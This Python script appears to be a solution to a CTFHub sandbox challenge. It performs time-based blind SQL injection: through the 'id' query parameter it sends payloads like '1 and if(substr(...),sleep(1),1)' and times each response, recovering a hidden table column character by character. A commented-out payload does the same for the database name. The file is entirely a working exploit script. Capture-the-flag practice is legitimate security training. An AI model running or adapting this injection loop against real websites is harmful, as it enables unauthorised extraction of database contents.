'''
@Descripttion: 
@version: 
@Author: chalan630
@Date: 2020-03-18 23:55:03
@LastEditTime: 2020-03-21 12:51:01
'''

import requests
import time

session = requests.session()
url = "http://challenge-8275a6b068ee702f.sandbox.ctfhub.com:10080/"
table = ""

list_1 = [element for element in range(48,58)]
list_2 = [element for element in range(97,126)]
list_0 = list_1 + list_2

for i in range(1, 50):
    print(i)
    for j in list_0:
        # payload = "1 and if(substr(database(),%d,1) ='%s',sleep(1),1)"%(i, chr(j))
        payload = "1 and if(substr((select ljvpqlbwbt from jwlaqmygfp),%d,1) = '%s',sleep(1),1)"%(i, chr(j))
        start_time = time.time()
        str_get = session.get(url=url + '?id=' + payload).text
        end_time = time.time()
        t = end_time - start_time
        if t > 1:
            table += chr(j)
            print(table)
            break
